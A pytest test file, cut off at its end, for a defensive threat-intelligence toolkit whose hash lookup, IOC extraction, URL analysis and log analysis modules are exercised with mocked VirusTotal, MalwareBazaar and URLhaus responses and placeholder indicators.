"""
Extended tests for tool modules to improve coverage.
Focuses on main() functions, format functions, and API classes.
"""

import json
import os
import sys
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch, mock_open

import pytest


# ============================================================================
# Hash Lookup - main(), format functions, API classes
# ============================================================================


class TestVirusTotalAPI:
    """Test VirusTotal API class"""

    def test_lookup_hash_success(self):
        from vlair.tools.hash_lookup import VirusTotalAPI

        api = VirusTotalAPI("test_key")
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            "data": {
                "attributes": {
                    "last_analysis_stats": {
                        "malicious": 10,
                        "suspicious": 2,
                        "undetected": 50,
                        "harmless": 5,
                    },
                    "last_analysis_results": {
                        "engine1": {"category": "malicious", "result": "Trojan.Gen"},
                        "engine2": {"category": "undetected", "result": None},
                    },
                    "first_submission_date": "2024-01-01",
                    "last_submission_date": "2024-06-01",
                }
            }
        }

        with patch("vlair.tools.hash_lookup.requests.get", return_value=mock_response):
            result = api.lookup_hash("abc123")

        assert result["source"] == "virustotal"
        assert result["verdict"] == "malicious"
        assert "Trojan.Gen" in result["malware_names"]

    def test_lookup_hash_not_found(self):
        from vlair.tools.hash_lookup import VirusTotalAPI

        api = VirusTotalAPI("test_key")
        mock_response = MagicMock()
        mock_response.status_code = 404

        with patch("vlair.tools.hash_lookup.requests.get", return_value=mock_response):
            result = api.lookup_hash("abc123")

        assert result["verdict"] == "unknown"

    def test_lookup_hash_error_status(self):
        from vlair.tools.hash_lookup import VirusTotalAPI

        api = VirusTotalAPI("test_key")
        mock_response = MagicMock()
        mock_response.status_code = 500

        with patch("vlair.tools.hash_lookup.requests.get", return_value=mock_response):
            result = api.lookup_hash("abc123")

        assert result["verdict"] == "error"

    def test_lookup_hash_exception(self):
        from vlair.tools.hash_lookup import VirusTotalAPI

        api = VirusTotalAPI("test_key")

        with patch(
            "vlair.tools.hash_lookup.requests.get", side_effect=Exception("timeout")
        ):
            result = api.lookup_hash("abc123")

        assert result["verdict"] == "error"
        assert "timeout" in result["error"]

    def test_lookup_hash_no_api_key(self):
        from vlair.tools.hash_lookup import VirusTotalAPI

        api = VirusTotalAPI("")
        result = api.lookup_hash("abc123")
        assert result is None

    def test_classify_verdict_malicious(self):
        from vlair.tools.hash_lookup import VirusTotalAPI

        api = VirusTotalAPI("key")
        assert api._classify_verdict({"malicious": 10}) == "malicious"

    def test_classify_verdict_suspicious(self):
        from vlair.tools.hash_lookup import VirusTotalAPI

        api = VirusTotalAPI("key")
        assert api._classify_verdict({"malicious": 1, "suspicious": 0}) == "suspicious"
        assert api._classify_verdict({"malicious": 0, "suspicious": 1}) == "suspicious"

    def test_classify_verdict_clean(self):
        from vlair.tools.hash_lookup import VirusTotalAPI

        api = VirusTotalAPI("key")
        assert api._classify_verdict({"malicious": 0, "suspicious": 0}) == "clean"


class TestMalwareBazaarAPI:
    """Test MalwareBazaar API class"""

    def test_lookup_hash_found(self):
        from vlair.tools.hash_lookup import MalwareBazaarAPI

        api = MalwareBazaarAPI()
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            "query_status": "ok",
            "data": [
                {
                    "signature": "Emotet",
                    "file_type": "exe",
                    "file_name": "malware.exe",
                    "tags": ["emotet", "trojan"],
                    "first_seen": "2024-01-01",
                }
            ],
        }

        with patch("vlair.tools.hash_lookup.requests.post", return_value=mock_response):
            result = api.lookup_hash("abc123")

        assert result["source"] == "malwarebazaar"
        assert result["verdict"] == "malicious"
        assert result["signature"] == "Emotet"

    def test_lookup_hash_not_found(self):
        from vlair.tools.hash_lookup import MalwareBazaarAPI

        api = MalwareBazaarAPI()
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"query_status": "hash_not_found"}

        with patch("vlair.tools.hash_lookup.requests.post", return_value=mock_response):
            result = api.lookup_hash("abc123")

        assert result["verdict"] == "unknown"

    def test_lookup_hash_exception(self):
        from vlair.tools.hash_lookup import MalwareBazaarAPI

        api = MalwareBazaarAPI()

        with patch(
            "vlair.tools.hash_lookup.requests.post", side_effect=Exception("error")
        ):
            result = api.lookup_hash("abc123")

        assert result["verdict"] == "error"


class TestHashLookupOrchestrator:
    """Test HashLookup main orchestrator"""

    def test_lookup_invalid_hash(self):
        from vlair.tools.hash_lookup import HashLookup

        with patch.dict(os.environ, {}, clear=True):
            lookup = HashLookup(cache_enabled=False, verbose=False)
            result = lookup.lookup("not_a_hash!")

        assert "error" in result

    def test_lookup_valid_hash_no_apis(self):
        from vlair.tools.hash_lookup import HashLookup

        with patch.dict(os.environ, {}, clear=True):
            lookup = HashLookup(cache_enabled=False, verbose=False)
            with patch.object(lookup.mb_api, "lookup_hash", return_value=None):
                result = lookup.lookup("d41d8cd98f00b204e9800998ecf8427e")

        assert result["hash"] == "d41d8cd98f00b204e9800998ecf8427e"
        assert result["verdict"] == "unknown"

    def test_lookup_batch(self):
        from vlair.tools.hash_lookup import HashLookup

        with patch.dict(os.environ, {}, clear=True):
            lookup = HashLookup(cache_enabled=False, verbose=True)
            with patch.object(
                lookup,
                "lookup",
                return_value={"hash": "x", "verdict": "clean"},
            ):
                results = lookup.lookup_batch(
                    [
                        "d41d8cd98f00b204e9800998ecf8427e",
                        "e3b0c44298fc1c149afbf4c8996fb924",
                    ]
                )

        assert len(results) == 2

    def test_classify_risk(self):
        from vlair.tools.hash_lookup import HashLookup

        with patch.dict(os.environ, {}, clear=True):
            lookup = HashLookup(cache_enabled=False)

        assert lookup._classify_risk("malicious") == "high"
        assert lookup._classify_risk("suspicious") == "medium"
        assert lookup._classify_risk("clean") == "low"
        assert lookup._classify_risk("unknown") == "unknown"

    def test_lookup_with_cache_hit(self):
        from vlair.tools.hash_lookup import HashLookup

        with patch.dict(os.environ, {}, clear=True):
            lookup = HashLookup(cache_enabled=False, verbose=True)
            # Simulate cache
            mock_cache = MagicMock()
            mock_cache.get.return_value = {"hash": "abc", "verdict": "clean"}
            lookup.cache = mock_cache

            result = lookup.lookup("d41d8cd98f00b204e9800998ecf8427e")

        assert result["cached"] is True


class TestHashLookupFormatFunctions:
    """Test hash lookup format functions"""

    def test_format_output_json(self):
        from vlair.tools.hash_lookup import format_output_json

        results = [
            {"hash": "abc", "verdict": "malicious"},
            {"hash": "def", "verdict": "clean"},
        ]
        metadata = {"lookup_date": "2024-01-01"}

        output = format_output_json(results, metadata)
        parsed = json.loads(output)

        assert parsed["summary"]["malicious"] == 1
        assert parsed["summary"]["clean"] == 1
        assert len(parsed["results"]) == 2

    def test_format_output_csv(self):
        from vlair.tools.hash_lookup import format_output_csv

        results = [
            {
                "hash": "abc123",
                "hash_type": "md5",
                "verdict": "malicious",
                "risk_level": "high",
                "cached": False,
                "sources": {
                    "virustotal": {
                        "detection_ratio": "10/70",
                        "malware_names": ["Trojan"],
                        "permalink": "https://vt.com/abc",
                    }
                },
            }
        ]

        output = format_output_csv(results)
        lines = output.strip().split("\n")
        assert len(lines) == 2
        assert "Hash,Type,Verdict" in lines[0]
        assert "abc123" in lines[1]


class TestHashLookupMain:
    """Test hash lookup main() function"""

    def test_main_no_hashes(self):
        from vlair.tools.hash_lookup import main

        with patch("sys.argv", ["lookup.py"]):
            with pytest.raises(SystemExit) as exc_info:
                main()
            assert exc_info.value.code == 1

    def test_main_with_hash(self):
        from vlair.tools.hash_lookup import main

        mock_lookup = MagicMock()
        mock_lookup.lookup_batch.return_value = [
            {"hash": "d41d8cd98f00b204e9800998ecf8427e", "verdict": "clean"}
        ]
        mock_lookup.cache = None

        with patch(
            "sys.argv", ["lookup.py", "d41d8cd98f00b204e9800998ecf8427e"]
        ), patch("vlair.tools.hash_lookup.HashLookup", return_value=mock_lookup):
            main()

    def test_main_with_file(self, tmp_path):
        from vlair.tools.hash_lookup import main

        hash_file = tmp_path / "hashes.txt"
        hash_file.write_text("d41d8cd98f00b204e9800998ecf8427e\n# comment\n\n")

        mock_lookup = MagicMock()
        mock_lookup.lookup_batch.return_value = [
            {"hash": "d41d8cd98f00b204e9800998ecf8427e", "verdict": "clean"}
        ]
        mock_lookup.cache = None

        with patch(
            "sys.argv", ["lookup.py", "--file", str(hash_file)]
        ), patch("vlair.tools.hash_lookup.HashLookup", return_value=mock_lookup):
            main()

    def test_main_file_not_found(self):
        from vlair.tools.hash_lookup import main

        with patch("sys.argv", ["lookup.py", "--file", "/nonexistent/file.txt"]):
            with pytest.raises(SystemExit) as exc_info:
                main()
            assert exc_info.value.code == 1

    def test_main_csv_format(self):
        from vlair.tools.hash_lookup import main

        mock_lookup = MagicMock()
        mock_lookup.lookup_batch.return_value = [
            {
                "hash": "d41d8cd98f00b204e9800998ecf8427e",
                "verdict": "clean",
                "hash_type": "md5",
                "risk_level": "low",
                "cached": False,
                "sources": {},
            }
        ]
        mock_lookup.cache = None

        with patch(
            "sys.argv",
            [
                "lookup.py",
                "d41d8cd98f00b204e9800998ecf8427e",
                "--format",
                "csv",
            ],
        ), patch("vlair.tools.hash_lookup.HashLookup", return_value=mock_lookup):
            main()

    def test_main_with_output_file(self, tmp_path):
        from vlair.tools.hash_lookup import main

        output_file = tmp_path / "output.json"

        mock_lookup = MagicMock()
        mock_lookup.lookup_batch.return_value = [
            {"hash": "d41d8cd98f00b204e9800998ecf8427e", "verdict": "clean"}
        ]
        mock_lookup.cache = None

        with patch(
            "sys.argv",
            [
                "lookup.py",
                "d41d8cd98f00b204e9800998ecf8427e",
                "--output",
                str(output_file),
            ],
        ), patch("vlair.tools.hash_lookup.HashLookup", return_value=mock_lookup):
            main()

        assert output_file.exists()

    def test_main_with_filter(self):
        from vlair.tools.hash_lookup import main

        mock_lookup = MagicMock()
        mock_lookup.lookup_batch.return_value = [
            {"hash": "abc", "verdict": "malicious"},
            {"hash": "def", "verdict": "clean"},
        ]
        mock_lookup.cache = None

        with patch(
            "sys.argv",
            [
                "lookup.py",
                "abc",
                "def",
                "--filter",
                "malicious",
            ],
        ), patch("vlair.tools.hash_lookup.HashLookup", return_value=mock_lookup):
            main()

    def test_main_verbose_with_cache(self):
        from vlair.tools.hash_lookup import main

        mock_cache = MagicMock()
        mock_cache.get_stats.return_value = {
            "hits": 5,
            "misses": 2,
            "hit_rate": 71.4,
        }

        mock_lookup = MagicMock()
        mock_lookup.lookup_batch.return_value = [
            {"hash": "abc", "verdict": "clean"}
        ]
        mock_lookup.cache = mock_cache
        mock_lookup.CACHE_NAMESPACE = "hash_lookup"

        with patch(
            "sys.argv",
            ["lookup.py", "abc", "--verbose"],
        ), patch("vlair.tools.hash_lookup.HashLookup", return_value=mock_lookup):
            main()


# ============================================================================
# IOC Extractor - main(), format functions
# ============================================================================


class TestIOCExtractorFormatFunctions:
    """Test IOC extractor format functions"""

    def test_format_output_json(self):
        from vlair.tools.ioc_extractor import format_output_json

        results = {"ips": ["1.2.3.4"], "domains": ["evil.com"]}
        metadata = {"source": "test"}

        output = format_output_json(results, metadata)
        parsed = json.loads(output)
        assert parsed["iocs"]["ips"] == ["1.2.3.4"]

    def test_format_output_csv(self):
        from vlair.tools.ioc_extractor import format_output_csv

        results = {
            "ips": ["1.2.3.4"],
            "domains": ["evil.com"],
            "urls": ["http://evil.com"],
            "emails": ["a@b.com"],
            "cves": ["CVE-2024-0001"],
            "hashes": {"md5": ["abc123"], "sha1": [], "sha256": [], "sha512": []},
        }

        output = format_output_csv(results)
        lines = output.strip().split("\n")
        assert lines[0] == "IOC_Type,Value"
        assert "ip,1.2.3.4" in lines
        assert "domain,evil.com" in lines

    def test_format_output_text(self):
        from vlair.tools.ioc_extractor import format_output_text

        results = {
            "ips": ["1.2.3.4"],
            "domains": ["evil.com"],
            "urls": ["http://evil.com"],
            "emails": ["a@b.com"],
            "cves": ["CVE-2024-0001"],
            "hashes": {"md5": ["abc123"], "sha1": [], "sha256": [], "sha512": []},
        }

        output = format_output_text(results)
        assert "=== IP Addresses ===" in output
        assert "=== Domains ===" in output
        assert "=== URLs ===" in output
        assert "=== Email Addresses ===" in output
        assert "=== CVEs ===" in output
        assert "=== MD5 Hashes ===" in output


class TestIOCExtractorMain:
    """Test IOC extractor main() function"""

    def test_main_with_file(self, tmp_path):
        from vlair.tools.ioc_extractor import main

        input_file = tmp_path / "report.txt"
        input_file.write_text("Found IP 1.2.3.4 and domain evil.com in report")

        with patch("sys.argv", ["extractor.py", str(input_file)]):
            main()

    def test_main_with_csv_format(self, tmp_path):
        from vlair.tools.ioc_extractor import main

        input_file = tmp_path / "report.txt"
        input_file.write_text("IP 1.2.3.4")

        with patch("sys.argv", ["extractor.py", str(input_file), "--format", "csv"]):
            main()

    def test_main_with_text_format(self, tmp_path):
        from vlair.tools.ioc_extractor import main

        input_file = tmp_path / "report.txt"
        input_file.write_text("IP 1.2.3.4")

        with patch("sys.argv", ["extractor.py", str(input_file), "--format", "txt"]):
            main()

    def test_main_with_stix_format(self, tmp_path):
        from vlair.tools.ioc_extractor import main

        input_file = tmp_path / "report.txt"
        input_file.write_text("IP 1.2.3.4")

        with patch(
            "sys.argv", ["extractor.py", str(input_file), "--format", "stix"]
        ):
            main()

    def test_main_file_not_found(self):
        from vlair.tools.ioc_extractor import main

        with patch("sys.argv", ["extractor.py", "/nonexistent/file.txt"]):
            with pytest.raises(SystemExit) as exc_info:
                main()
            assert exc_info.value.code == 1

    def test_main_with_output(self, tmp_path):
        from vlair.tools.ioc_extractor import main

        input_file = tmp_path / "report.txt"
        input_file.write_text("IP 1.2.3.4")
        output_file = tmp_path / "output.json"

        with patch(
            "sys.argv",
            ["extractor.py", str(input_file), "--output", str(output_file)],
        ):
            main()

        assert output_file.exists()

    def test_main_verbose(self, tmp_path):
        from vlair.tools.ioc_extractor import main

        input_file = tmp_path / "report.txt"
        input_file.write_text("IP 1.2.3.4")

        with patch(
            "sys.argv", ["extractor.py", str(input_file), "--verbose"]
        ):
            main()

    def test_main_with_types(self, tmp_path):
        from vlair.tools.ioc_extractor import main

        input_file = tmp_path / "report.txt"
        input_file.write_text("IP 1.2.3.4 and domain evil.com")

        with patch(
            "sys.argv",
            ["extractor.py", str(input_file), "--types", "ip,domain"],
        ):
            main()

    def test_main_with_defang(self, tmp_path):
        from vlair.tools.ioc_extractor import main

        input_file = tmp_path / "report.txt"
        input_file.write_text("IP 1.2.3.4")

        with patch(
            "sys.argv", ["extractor.py", str(input_file), "--defang"]
        ):
            main()

    def test_main_with_refang(self, tmp_path):
        from vlair.tools.ioc_extractor import main

        input_file = tmp_path / "report.txt"
        input_file.write_text("IP 1[.]2[.]3[.]4")

        with patch(
            "sys.argv", ["extractor.py", str(input_file), "--refang"]
        ):
            main()

    def test_main_with_no_private_ips(self, tmp_path):
        from vlair.tools.ioc_extractor import main

        input_file = tmp_path / "report.txt"
        input_file.write_text("IP 192.168.1.1 and 8.8.8.8")

        with patch(
            "sys.argv",
            ["extractor.py", str(input_file), "--no-private-ips"],
        ):
            main()

    def test_main_stdin_no_input(self):
        from vlair.tools.ioc_extractor import main

        with patch("sys.argv", ["extractor.py"]), patch(
            "sys.stdin"
        ) as mock_stdin:
            mock_stdin.isatty.return_value = True
            with pytest.raises(SystemExit) as exc_info:
                main()
            assert exc_info.value.code == 1

    def test_main_stdin_with_data(self):
        from vlair.tools.ioc_extractor import main

        with patch("sys.argv", ["extractor.py", "-"]), patch(
            "sys.stdin"
        ) as mock_stdin:
            mock_stdin.isatty.return_value = False
            mock_stdin.read.return_value = "Found IP 1.2.3.4"
            main()


# ============================================================================
# URL Analyzer - format functions, API classes, main()
# ============================================================================


class TestVirusTotalURLAPI:
    """Test VirusTotal URL API class"""

    def test_analyze_url_success(self):
        from vlair.tools.url_analyzer import VirusTotalURLAPI

        api = VirusTotalURLAPI("test_key")
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            "data": {
                "attributes": {
                    "last_analysis_stats": {
                        "malicious": 5,
                        "suspicious": 1,
                        "harmless": 60,
                        "undetected": 4,
                    },
                    "categories": {"Fortinet": "malware"},
                    "last_analysis_date": "2024-01-01",
                }
            }
        }

        with patch("vlair.tools.url_analyzer.requests.get", return_value=mock_response):
            result = api.analyze_url("http://evil.com")

        assert result["source"] == "virustotal"
        assert result["verdict"] == "malicious"

    def test_analyze_url_not_found(self):
        from vlair.tools.url_analyzer import VirusTotalURLAPI

        api = VirusTotalURLAPI("test_key")
        mock_response = MagicMock()
        mock_response.status_code = 404

        with patch("vlair.tools.url_analyzer.requests.get", return_value=mock_response):
            result = api.analyze_url("http://example.com")

        assert result["verdict"] == "unknown"

    def test_analyze_url_error(self):
        from vlair.tools.url_analyzer import VirusTotalURLAPI

        api = VirusTotalURLAPI("test_key")
        mock_response = MagicMock()
        mock_response.status_code = 500

        with patch("vlair.tools.url_analyzer.requests.get", return_value=mock_response):
            result = api.analyze_url("http://evil.com")

        assert result["verdict"] == "error"

    def test_analyze_url_exception(self):
        from vlair.tools.url_analyzer import VirusTotalURLAPI

        api = VirusTotalURLAPI("test_key")

        with patch(
            "vlair.tools.url_analyzer.requests.get", side_effect=Exception("timeout")
        ):
            result = api.analyze_url("http://evil.com")

        assert result["verdict"] == "error"

    def test_no_api_key(self):
        from vlair.tools.url_analyzer import VirusTotalURLAPI

        api = VirusTotalURLAPI("")
        result = api.analyze_url("http://evil.com")
        assert result is None

    def test_classify_verdict(self):
        from vlair.tools.url_analyzer import VirusTotalURLAPI

        api = VirusTotalURLAPI("key")
        assert api._classify_verdict({"malicious": 5}) == "malicious"
        assert api._classify_verdict({"malicious": 1}) == "suspicious"
        assert api._classify_verdict({"malicious": 0, "suspicious": 2}) == "suspicious"
        assert (
            api._classify_verdict({"malicious": 0, "suspicious": 0, "harmless": 10})
            == "clean"
        )
        assert (
            api._classify_verdict({"malicious": 0, "suspicious": 0, "harmless": 0})
            == "unknown"
        )


class TestURLhausAPI:
    """Test URLhaus API class"""

    def test_lookup_found(self):
        from vlair.tools.url_analyzer import URLhausAPI

        api = URLhausAPI()
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            "query_status": "ok",
            "threat": "malware_download",
            "tags": ["emotet"],
            "date_added": "2024-01-01",
            "url_status": "online",
            "reporter": "test",
            "urlhaus_reference": "https://urlhaus.abuse.ch/url/123/",
        }

        with patch(
            "vlair.tools.url_analyzer.requests.post", return_value=mock_response
        ):
            result = api.lookup_url("http://evil.com/malware.exe")

        assert result["verdict"] == "malicious"

    def test_lookup_not_found(self):
        from vlair.tools.url_analyzer import URLhausAPI

        api = URLhausAPI()
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"query_status": "no_results"}

        with patch(
            "vlair.tools.url_analyzer.requests.post", return_value=mock_response
        ):
            result = api.lookup_url("http://safe.com")

        assert result["verdict"] == "unknown"

    def test_lookup_exception(self):
        from vlair.tools.url_analyzer import URLhausAPI

        api = URLhausAPI()

        with patch(
            "vlair.tools.url_analyzer.requests.post", side_effect=Exception("error")
        ):
            result = api.lookup_url("http://evil.com")

        assert result["verdict"] == "error"


class TestURLAnalyzerOrchestrator:
    """Test URLAnalyzer main class"""

    def test_analyze_invalid_url(self):
        from vlair.tools.url_analyzer import URLAnalyzer

        with patch.dict(os.environ, {}, clear=True):
            analyzer = URLAnalyzer(cache_enabled=False)
            result = analyzer.analyze("not a url")

        assert "error" in result

    def test_calculate_verdict_urlhaus_malicious(self):
        from vlair.tools.url_analyzer import URLAnalyzer

        with patch.dict(os.environ, {}, clear=True):
            analyzer = URLAnalyzer(cache_enabled=False)

        result = {
            "threat_intelligence": {
                "urlhaus": {"verdict": "malicious"},
            },
            "pattern_analysis": {"is_suspicious": False},
        }
        assert analyzer._calculate_verdict(result) == "malicious"

    def test_calculate_verdict_vt_suspicious(self):
        from vlair.tools.url_analyzer import URLAnalyzer

        with patch.dict(os.environ, {}, clear=True):
            analyzer = URLAnalyzer(cache_enabled=False)

        result = {
            "threat_intelligence": {
                "virustotal": {"verdict": "suspicious"},
            },
            "pattern_analysis": {"is_suspicious": False},
        }
        assert analyzer._calculate_verdict(result) == "suspicious"

    def test_calculate_verdict_pattern_suspicious(self):
        from vlair.tools.url_analyzer import URLAnalyzer

        with patch.dict(os.environ, {}, clear=True):
            analyzer = URLAnalyzer(cache_enabled=False)

        result = {
            "threat_intelligence": {},
            "pattern_analysis": {"is_suspicious": True},
        }
        assert analyzer._calculate_verdict(result) == "suspicious"

    def test_calculate_verdict_clean(self):
        from vlair.tools.url_analyzer import URLAnalyzer

        with patch.dict(os.environ, {}, clear=True):
            analyzer = URLAnalyzer(cache_enabled=False)

        result = {
            "threat_intelligence": {
                "virustotal": {"verdict": "clean"},
            },
            "pattern_analysis": {"is_suspicious": False},
        }
        assert analyzer._calculate_verdict(result) == "clean"

    def test_classify_risk(self):
        from vlair.tools.url_analyzer import URLAnalyzer

        with patch.dict(os.environ, {}, clear=True):
            analyzer = URLAnalyzer(cache_enabled=False)

        assert (
            analyzer._classify_risk(
                {"verdict": "malicious", "pattern_analysis": {"risk_score": 0}}
            )
            == "high"
        )
        assert (
            analyzer._classify_risk(
                {"verdict": "suspicious", "pattern_analysis": {"risk_score": 0}}
            )
            == "medium"
        )
        assert (
            analyzer._classify_risk(
                {"verdict": "clean", "pattern_analysis": {"risk_score": 0}}
            )
            == "low"
        )
        assert (
            analyzer._classify_risk(
                {"verdict": "unknown", "pattern_analysis": {"risk_score": 0}}
            )
            == "unknown"
        )

    def test_analyze_batch(self):
        from vlair.tools.url_analyzer import URLAnalyzer

        with patch.dict(os.environ, {}, clear=True):
            analyzer = URLAnalyzer(cache_enabled=False, verbose=True)
            with patch.object(
                analyzer,
                "analyze",
                return_value={"url": "http://x.com", "verdict": "clean"},
            ):
                results = analyzer.analyze_batch(
                    ["http://a.com", "http://b.com"]
                )

        assert len(results) == 2


class TestURLAnalyzerFormatFunctions:
    """Test URL analyzer format functions"""

    def test_format_output_json(self):
        from vlair.tools.url_analyzer import format_output_json

        results = [{"url": "http://evil.com", "verdict": "malicious"}]
        metadata = {"tool": "url_analyzer"}

        output = format_output_json(results, metadata)
        parsed = json.loads(output)
        assert len(parsed["results"]) == 1

    def test_format_output_csv(self):
        from vlair.tools.url_analyzer import format_output_csv

        results = [
            {
                "url": "http://evil.com",
                "verdict": "malicious",
                "risk_level": "high",
                "threat_intelligence": {
                    "virustotal": {"malicious": 5},
                    "urlhaus": {"verdict": "malicious"},
                },
                "pattern_analysis": {"suspicions": ["suspicious TLD"]},
            }
        ]

        output = format_output_csv(results)
        lines = output.strip().split("\n")
        assert len(lines) == 2

    def test_format_output_text(self):
        from vlair.tools.url_analyzer import format_output_text

        results = [
            {
                "url": "http://evil.com",
                "verdict": "malicious",
                "risk_level": "high",
                "pattern_analysis": {
                    "risk_score": 80,
                    "suspicions": ["IP in URL"],
                },
                "threat_intelligence": {
                    "virustotal": {
                        "verdict": "malicious",
                        "malicious": 5,
                        "suspicious": 1,
                    },
                    "urlhaus": {
                        "verdict": "malicious",
                        "threat": "malware",
                        "tags": ["trojan"],
                    },
                },
            }
        ]

        output = format_output_text(results)
        assert "MALICIOUS" in output
        assert "IP in URL" in output
        assert "VirusTotal:" in output
        assert "URLhaus: MALICIOUS" in output


class TestURLAnalyzerMain:
    """Test URL analyzer main() function"""

    def test_main_no_urls(self):
        from vlair.tools.url_analyzer import main

        with patch("sys.argv", ["analyzer.py"]):
            with pytest.raises(SystemExit) as exc_info:
                main()
            assert exc_info.value.code == 1

    def test_main_with_url(self):
        from vlair.tools.url_analyzer import main

        mock_analyzer = MagicMock()
        mock_analyzer.analyze_batch.return_value = [
            {"url": "http://test.com", "verdict": "clean"}
        ]

        with patch(
            "sys.argv", ["analyzer.py", "http://test.com"]
        ), patch("vlair.tools.url_analyzer.URLAnalyzer", return_value=mock_analyzer):
            main()

    def test_main_with_file(self, tmp_path):
        from vlair.tools.url_analyzer import main

        url_file = tmp_path / "urls.txt"
        url_file.write_text("http://test.com\nhttp://example.com\n")

        mock_analyzer = MagicMock()
        mock_analyzer.analyze_batch.return_value = [
            {"url": "http://test.com", "verdict": "clean"},
            {"url": "http://example.com", "verdict": "clean"},
        ]

        with patch(
            "sys.argv", ["analyzer.py", "--file", str(url_file)]
        ), patch("vlair.tools.url_analyzer.URLAnalyzer", return_value=mock_analyzer):
            main()

    def test_main_file_not_found(self):
        from vlair.tools.url_analyzer import main

        with patch("sys.argv", ["analyzer.py", "--file", "/nonexistent.txt"]):
            with pytest.raises(SystemExit) as exc_info:
                main()
            assert exc_info.value.code == 1

    def test_main_csv_format(self):
        from vlair.tools.url_analyzer import main

        mock_analyzer = MagicMock()
        mock_analyzer.analyze_batch.return_value = [
            {
                "url": "http://test.com",
                "verdict": "clean",
                "risk_level": "low",
                "threat_intelligence": {},
                "pattern_analysis": {"suspicions": []},
            }
        ]

        with patch(
            "sys.argv", ["analyzer.py", "http://test.com", "--format", "csv"]
        ), patch("vlair.tools.url_analyzer.URLAnalyzer", return_value=mock_analyzer):
            main()

    def test_main_txt_format(self):
        from vlair.tools.url_analyzer import main

        mock_analyzer = MagicMock()
        mock_analyzer.analyze_batch.return_value = [
            {
                "url": "http://test.com",
                "verdict": "clean",
                "risk_level": "low",
                "threat_intelligence": {},
                "pattern_analysis": {"suspicions": [], "risk_score": 0},
            }
        ]

        with patch(
            "sys.argv", ["analyzer.py", "http://test.com", "--format", "txt"]
        ), patch("vlair.tools.url_analyzer.URLAnalyzer", return_value=mock_analyzer):
            main()

    def test_main_with_output(self, tmp_path):
        from vlair.tools.url_analyzer import main

        output_file = tmp_path / "result.json"

        mock_analyzer = MagicMock()
        mock_analyzer.analyze_batch.return_value = [
            {"url": "http://test.com", "verdict": "clean"}
        ]

        with patch(
            "sys.argv",
            [
                "analyzer.py",
                "http://test.com",
                "--output",
                str(output_file),
            ],
        ), patch("vlair.tools.url_analyzer.URLAnalyzer", return_value=mock_analyzer):
            main()

        assert output_file.exists()


# ============================================================================
# Log Analyzer - format functions, main()
# ============================================================================


class TestLogAnalyzerFormatFunctions:
    """Test log analyzer format functions"""

    def test_format_output_json(self):
        from vlair.tools.log_analyzer import format_output_json

        results = {"metadata": {"log_file": "test.log"}, "alerts": []}
        output = format_output_json(results)
        parsed = json.loads(output)
        assert parsed["metadata"]["log_file"] == "test.log"

    def test_format_output_csv(self):
        from vlair.tools.log_analyzer import format_output_csv

        results = {
            "alerts": [
                {
                    "type": "sql_injection",
                    "severity": "high",
                    "description": "SQL injection detected",
                    "source_ip": "1.2.3.4",
                    "timestamp": "2024-01-01",
                }
            ]
        }

        output = format_output_csv(results)
        lines = output.strip().split("\n")
        assert lines[0] == "Type,Severity,Description,Source,Timestamp"
        assert "sql_injection" in lines[1]

    def test_format_output_text(self):
        from vlair.tools.log_analyzer import format_output_text

        results = {
            "metadata": {
                "log_file": "test.log",
                "log_type": "apache",
                "total_entries": 100,
                "total_alerts": 5,
                "analysis_date": "2024-01-01",
            },
            "summary": {
                "alerts_by_type": {"sql_injection": 3, "xss": 2},
                "alerts_by_severity": {"high": 3, "medium": 2},
            },
            "statistics": {
                "top_ips": [{"ip": "1.2.3.4", "count": 50}],
                "top_paths": [{"path": "/admin", "count": 20}],
                "status_codes": {"200": 80, "404": 20},
            },
            "alerts": [
                {
                    "type": "sql_injection",
                    "severity": "high",
                    "description": "SQL injection attempt",
                    "source_ip": "1.2.3.4",
                    "timestamp": "2024-01-01 10:00:00",
                }
            ],
        }

        output = format_output_text(results)
        assert "LOG ANALYSIS REPORT" in output
        assert "sql_injection" in output
        assert "1.2.3.4" in output
        assert "/admin" in output


class TestLogAnalyzerMain:
    """Test log analyzer main() function"""

    def test_main_with_apache_log(self, tmp_path):
        from vlair.tools.log_analyzer import main

        log_file = tmp_path / "access.log"
        log_file.write_text(
            '192.168.1.1 - - [01/Jan/2024:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0"\n'
        )

        with patch("sys.argv", ["analyzer.py", str(log_file)]):
            main()

    def test_main_with_csv_format(self, tmp_path):
        from vlair.tools.log_analyzer import main

        log_file = tmp_path / "access.log"
        log_file.write_text(
            '192.168.1.1 - - [01/Jan/2024:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0"\n'
        )

        with patch(
            "sys.argv", ["analyzer.py", str(log_file), "--format", "csv"]
        ):
            main()

    def test_main_with_text_format(self, tmp_path):
        from vlair.tools.log_analyzer import main

        log_file = tmp_path / "access.log"
        log_file.write_text(
            '192.168.1.1 - - [01/Jan/2024:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0"\n'
        )

        with patch(
            "sys.argv", ["analyzer.py", str(log_file), "--format", "txt"]
        ):
            main()

    def test_main_file_not_found(self):
        from vlair.tools.log_analyzer import main

        with patch("sys.argv", ["analyzer.py", "/nonexistent.log"]):
            with pytest.raises(SystemExit) as exc_info:
                main()
            assert exc_info.value.code == 1

    def test_main_with_output(self, tmp_path):
        from vlair.tools.log_analyzer import main

        log_file = tmp_path / "access.log"
        log_file.write_text(
            '192.168.1.1 - - [01/Jan/2024:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0"\n'
        )
        output_file = tmp_path / "result.json"

        with patch(
            "sys.argv",
            [
                "analyzer.py",
                str(log_file),
                "--output",
                str(output_file),
            ],
        ):
            main()

        assert output_file.exists()

    def test_main_verbose(self, tmp_path):
        from vlair.tools.log_analyzer import main

        log_file = tmp_path / "access.log"
        log_file.write_text(
            '192.168.1.1 - - [01/Jan/2024:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0"\n'
        )

        with patch(
            "sys.argv", ["analyzer.py", str(log_file), "--verbose"]
        ):
            main()

    def test_main_syslog(self, tmp_path):
